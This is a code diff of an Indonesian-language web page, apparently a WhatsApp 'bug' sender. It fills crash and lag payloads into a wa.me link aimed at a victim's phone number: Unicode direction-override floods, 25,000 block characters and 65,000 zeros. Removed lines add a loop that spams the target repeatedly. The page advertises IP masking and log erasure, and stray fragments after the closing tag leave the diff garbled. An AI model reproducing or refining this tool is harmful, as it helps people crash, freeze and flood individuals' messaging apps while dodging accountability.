@@ -1,160 +1,159 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CALEB | GHOST COMMANDER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CALEB | VIP MOBILE COMMANDER</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Rajdhani:wght@300;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
     <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    
     <style>
-        :root { --primary: #8b5cf6; --accent: #ff0000; --bg: #010103; }
-        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; overflow-x: hidden; }
-        .glass-vip { background: rgba(8, 4, 15, 0.95); backdrop-filter: blur(25px); border: 1px solid rgba(139, 92, 246, 0.3); }
-        .neon-text { text-shadow: 0 0 15px var(--primary); }
-        .grid-bg { position: fixed; inset: 0; background-image: linear-gradient(rgba(139, 92, 246, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(139, 92, 246, 0.05) 1px, transparent 1px); background-size: 30px 30px; z-index: -1; }
-        .btn-ghost { background: linear-gradient(45deg, #1e1b4b, #7f1d1d); border: 1px solid var(--accent); transition: 0.5s; }
-        .btn-ghost:hover { box-shadow: 0 0 30px var(--accent); letter-spacing: 4px; }
+        :root { --p: #a855f7; --s: #ef4444; --bg: #030005; }
+        body { 
+            background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; 
+            overflow-x: hidden; -webkit-tap-highlight-color: transparent;
+        }
+        
+        /* Cinematic Grid & Glow */
+        .bg-abyss {
+            position: fixed; inset: 0; z-index: -1;
+            background: radial-gradient(circle at 50% 50%, #1e1b4b 0%, #030005 100%);
+        }
+        .bg-abyss::after {
+            content: ""; position: absolute; inset: 0;
+            background-image: linear-gradient(var(--p) 0.5px, transparent 0.5px), linear-gradient(90deg, var(--p) 0.5px, transparent 0.5px);
+            background-size: 30px 30px; opacity: 0.05;
+        }
+
+        /* VIP Glass Design */
+        .glass-card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(168, 85, 247, 0.2);
+            border-radius: 30px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+        }
+
+        /* Neon Animations */
+        .neon-text { text-shadow: 0 0 15px var(--p); }
+        .neon-border-pulse { animation: border-pulse 2s infinite; }
+        @keyframes border-pulse {
+            0% { border-color: rgba(168, 85, 247, 0.2); }
+            50% { border-color: rgba(239, 68, 68, 0.5); }
+            100% { border-color: rgba(168, 85, 247, 0.2); }
+        }
+
+        /* Mobile Optimization */
+        input, select, textarea {
+            background: rgba(0,0,0,0.4) !important;
+            border: 1px solid rgba(168, 85, 247, 0.3) !important;
+            color: var(--p) !important;
+            font-size: 16px !important; /* Fix auto-zoom iOS */
+        }
+        .btn-vip {
+            background: linear-gradient(45deg, #6b21a8, #991b1b);
+            transition: 0.3s; font-family: 'Orbitron';
+        }
+        .btn-vip:active { transform: scale(0.92); filter: brightness(1.2); }
     </style>
 </head>
-<body class="grid-bg">
+<body>
+    <div class="bg-abyss"></div>
 
     <audio id="dark-bgm" loop><source src="https://files.catbox.moe/k6n2zo.mp3" type="audio/mpeg"></audio>
-    <div onclick="playMusic()" id="m-btn" class="fixed bottom-5 right-5 z-50 p-4 bg-purple-900 rounded-full cursor-pointer animate-bounce border border-purple-400 text-[10px] font-black uppercase">🔊 Open Symphony</div>
+    <div onclick="toggleMusic()" id="music-fab" class="fixed bottom-6 right-6 z-50 p-4 glass-card neon-border-pulse cursor-pointer">
+        <span id="music-icon" class="text-xs font-black uppercase">🔊 Music</span>
+    </div>
 
-    <nav class="fixed w-full z-50 glass-vip p-6 flex justify-between items-center border-b border-purple-900/40">
-        <div class="text-3xl font-black neon-text italic">CALEB<span class="text-red-600">.GHOST</span></div>
-        <div class="text-[10px] font-bold tracking-[0.5em] text-zinc-500 uppercase">Status: Invisible Mode</div>
+    <nav class="fixed top-0 w-full z-40 p-6 flex justify-between items-center bg-black/20 backdrop-blur-md">
+        <div class="text-2xl font-black neon-text italic uppercase tracking-tighter">CALEB<span class="text-red-600">.VIP</span></div>
+        <div class="text-[9px] font-bold text-zinc-500 border border-zinc-800 px-3 py-1 rounded-full uppercase tracking-widest">Mobile Encrypted</div>
     </nav>
 
-    <section class="h-screen flex flex-col justify-center items-center text-center px-4">
-        <h1 class="text-7xl md:text-[8rem] font-black italic tracking-tighter mb-4" data-aos="zoom-in">THE<br><span class="text-transparent" style="-webkit-text-stroke: 2px #8b5cf6;">GHOST</span></h1>
-        <p class="text-zinc-500 max-w-lg mb-10 italic" data-aos="fade-up">"Menghancurkan tanpa terlihat. Lokasimu adalah misteri, seranganmu adalah fakta. ZEHAHAHA!"</p>
-        <a href="#breaker" class="px-12 py-4 btn-ghost rounded-full font-black uppercase tracking-widest text-xs">Enter Command Center</a>
-    </section>
+    <main class="min-h-screen pt-32 px-6 flex flex-col items-center">
+        <div class="text-center mb-12" data-aos="zoom-in">
+            <h2 class="text-purple-500 text-[10px] tracking-[1em] uppercase font-bold mb-2">Absolute Control</h2>
+            <h1 class="text-6xl font-black italic tracking-tighter leading-none mb-4">COMMAND<br><span class="text-transparent" style="-webkit-text-stroke: 1px #a855f7;">CENTER</span></h1>
+            <p class="text-zinc-500 text-xs italic tracking-widest">"Dunia dalam genggaman, kegelapan dalam pikiran."</p>
+        </div>
 
-    <section id="breaker" class="py-20 px-6">
-        <div class="max-w-4xl mx-auto glass-vip rounded-3xl p-10 relative overflow-hidden" data-aos="fade-up">
-            <h2 class="text-4xl font-black mb-8 italic border-b border-purple-900 pb-4 text-white">STEALTH_PANEL v5.0</h2>
-            
+        <div class="w-full max-w-md glass-card p-8 mb-24 neon-border-pulse" data-aos="fade-up">
             <div class="space-y-6">
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                    <div>
-                        <label class="text-[10px] uppercase font-bold text-purple-500 mb-2 block">Target ID</label>
-                        <input id="target" type="text" placeholder="62XXXXXXXXXXX" class="w-full bg-black/60 border border-zinc-800 p-4 rounded-xl text-purple-400 outline-none focus:border-purple-500">
-                    </div>
-                    <div>
-                        <label class="text-[10px] uppercase font-bold text-red-500 mb-2 block">Jutsu Selection</label>
-                        <select id="template" onchange="loadBug()" class="w-full bg-black/60 border border-zinc-800 p-4 rounded-xl text-red-500 outline-none focus:border-red-500 uppercase font-bold text-xs">
-                            <option value="">-- PILIH JUTSU --</option>
-                            <option value="FC">Yami Freeze (Force Close)</option>
-                            <option value="LAG">Void Lag (RAM Eater)</option>
-                            <option value="JAM">Dark Jammer (Centang 1)</option>
-                        </select>
-                    </div>
+                <div>
+                    <label class="text-[10px] uppercase font-black text-purple-400 mb-2 block tracking-widest">Target ID (No WA)</label>
+                    <input id="target" type="tel" placeholder="628XXXXXXXXX" class="w-full p-4 rounded-2xl outline-none focus:border-red-500 transition-all font-mono">
                 </div>
 
                 <div>
-                    <label class="text-[10px] uppercase font-bold text-purple-500 mb-2 block">Payload Generator</label>
-                    <textarea id="msg" class="w-full bg-black/60 border border-zinc-800 p-4 rounded-xl h-32 italic text-sm text-zinc-400 outline-none focus:border-purple-500"></textarea>
+                    <label class="text-[10px] uppercase font-black text-red-500 mb-2 block tracking-widest">Select Jutsu Bug</label>
+                    <select id="jutsu" onchange="autoFill()" class="w-full p-4 rounded-2xl outline-none font-bold text-xs uppercase">
+                        <option value="">-- PILIH BUG --</option>
+                        <option value="FC">Yami Freeze (Force Close)</option>
+                        <option value="LAG">Void Lag (Heavy Ram)</option>
+                        <option value="JAM">Dark Jammer (Centang 1)</option>
+                    </select>
                 </div>
 
-                <div class="flex items-center gap-4 text-[10px] text-zinc-600 font-bold uppercase mb-4">
-                    <input type="checkbox" checked disabled> <span>IP Masking Active</span>
-                    <input type="checkbox" checked disabled> <span>Self-Destruct Logs On</span>
+                <div>
+                    <label class="text-[10px] uppercase font-black text-purple-400 mb-2 block tracking-widest">Payload Data</label>
+                    <textarea id="payload" class="w-full p-4 rounded-2xl h-24 text-xs italic outline-none" placeholder="Payload Bug..."></textarea>
                 </div>
 
-                <button onclick="executeGacor()" class="w-full py-6 btn-ghost rounded-2xl font-black text-lg uppercase tracking-[0.6em]">
-                    EXECUTE_STEALTH
+                <div class="flex items-center justify-between text-[8px] text-zinc-600 font-black uppercase bg-black/40 p-3 rounded-xl">
+                    <span>IP-Masking: ON</span>
+                    <span>Ghost-Mode: ACTIVE</span>
+                    <span>Self-Destruct: ON</span>
+                </div>
+
+                <button onclick="launchBreaker()" class="w-full py-5 btn-vip rounded-2xl text-white font-black text-xs uppercase tracking-[0.5em] shadow-[0_0_20px_rgba(168,85,247,0.3)]">
+                    EXECUTE_DARKNESS
                 </button>
             </div>
         </div>
-    </section>
+    </main>
 
-    <footer class="py-10 text-center text-zinc-800 text-[10px] uppercase tracking-widest italic">
-        "Kegelapan adalah pelindung terbaik. Captain Caleb © 2026"
+    <footer class="py-10 text-center bg-black/50">
+        <p class="text-[8px] text-zinc-700 tracking-[0.8em] uppercase mb-2">Captain Caleb Blackbeard</p>
+        <p class="text-[10px] italic text-zinc-500 font-bold uppercase tracking-widest">"ZEHAHAHA! NO TRACE LEFT!"</p>
     </footer>
 
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
     <script>
-        AOS.init();
-        const bugs = {
-            "FC": "\u202E".repeat(700) + " [FORCE_CLOSE_ACTIVE] " + "\u202D".repeat(700),
-            "LAG": "░".repeat(20000) + " [VOID_LAG]",
+        AOS.init({ duration: 1000, once: true });
+
+        const dataBug = {
+            "FC": "\u202E".repeat(800) + " [SYSTEM_CRASH_BY_CALEB] " + "\u202D".repeat(800),
+            "LAG": "░".repeat(25000) + " [SYSTEM_LAG_V9]",
             "JAM": "0".repeat(65000)
         };
 
-        function playMusic() { document.getElementById('dark-bgm').play(); document.getElementById('m-btn').style.display = 'none'; }
-        function loadBug() { document.getElementById('msg').value = bugs[document.getElementById('template').value] || ""; }
+        function toggleMusic() {
+            const a = document.getElementById('dark-bgm');
+            if(a.paused) { a.play(); document.getElementById('music-icon').innerText = "⏸ Playing"; }
+            else { a.pause(); document.getElementById('music-icon').innerText = "🔊 Music"; }
+        }
 
-        async function executeGacor() {
+        function autoFill() {
+            const choice = document.getElementById('jutsu').value;
+            document.getElementById('payload').value = dataBug[choice] || "";
+        }
+
+        async function launchBreaker() {
             const target = document.getElementById('target').value;
-            const msg = document.getElementById('msg').value;
-            if(!target || !msg) return alert("[!] Masukkan Target!");
-
-            alert("[🛡️] MASKING IP... ENCRYPTING PACKETS... ZEHAHAHA!");
-
-            // STEALTH MODE: Gunakan Redirect sebagai demo, atau sambungkan ke Backend Proxy lu
-            const shadowUrl = `https://api.whatsapp.com/send?phone=${target}&text=${encodeURIComponent(msg)}`;
+            const msg = document.getElementById('payload').value;
             
-            // Self Destruct Simulation
+            if(!target || !msg) return alert("Peringatan: Isi Nomor & Jutsu!");
+
+            // Visual Loading VIP
+            document.querySelector('.btn-vip').innerText = "SCRRAMBLING_IP...";
+            
             setTimeout(() => {
+                const finalUrl = `https://api.whatsapp.com/send?phone=${target}&text=${encodeURIComponent(msg)}`;
+                window.open(finalUrl, '_blank');
+                document.querySelector('.btn-vip').innerText = "EXECUTE_DARKNESS";
                 console.clear();
-                alert("[🔥] GHOST MODE SUCCESS: Logs have been swallowed by the Void!");
-                window.open(shadowUrl, '_blank');
-            }, 1000);
-        }
-    </script>
-</body>
-</html>
-style.display = 'none';
-        }
-
-        // PAYLOAD GENERATOR (BREAKER LOGIC)
-        function generatePayload(mode, text) {
-            let result = text + "\n\n[🌑 VOID SYSTEM BY CALEB]\n";
-            if (mode === "LAG") {
-                // Ribuan karakter transparan untuk FPS drop
-                result += "░".repeat(20000) + " [LAG_STUCK]";
-            } else if (mode === "FC") {
-                // Unicode RTL/LTR Loop yang bikin Crash
-                result += "\u202E".repeat(700) + " [FORCE_CLOSE_INIT]" + "\u202D".repeat(700);
-            } else if (mode === "JAMMER") {
-                // Buffer maksimal (64KB) untuk jamming koneksi
-                result += "0".repeat(65000);
-            }
-            return result;
-        }
-
-        // FINAL EXECUTION (AUTO SPAM + BREAKER)
-        async function executeBreaker() {
-            const target = document.getElementById('target').value;
-            const mode = document.getElementById('mode').value;
-            const msg = document.getElementById('msg').value;
-            const count = parseInt(document.getElementById('spam_count').value);
-
-            if (!target || !msg) {
-                return alert("[VOID] Masukkan target dan pesan, Captain!");
-            }
-
-            const payload = generatePayload(mode, msg);
-            alert(`[BLACKBEARD ⚫] ZEHAHAHA! MENGAKTIFKAN ${mode} DENGAN ${count}x BURST!`);
-
-            // BURST LOOP
-            for (let i = 0; i < count; i++) {
-                console.log(`[☠️] Executing Burst ${i + 1}`);
-                
-                // Menggunakan Redirect WA sebagai pemicu utama
-                const waUrl = `https://api.whatsapp.com/send?phone=${target}&text=${encodeURIComponent(payload)}`;
-                window.open(waUrl, '_blank');
-
-                // Jeda 1.2 detik agar browser tidak memblokir pop-up beruntun
-                if (count > 1) {
-                    await new Promise(r => setTimeout(r, 1200));
-                }
-            }
-            
-            alert("QUAKEN IMPACT SELESAI! Target telah ditelan kegelapan. 💀");
+            }, 1200);
         }
     </script>
 </body>
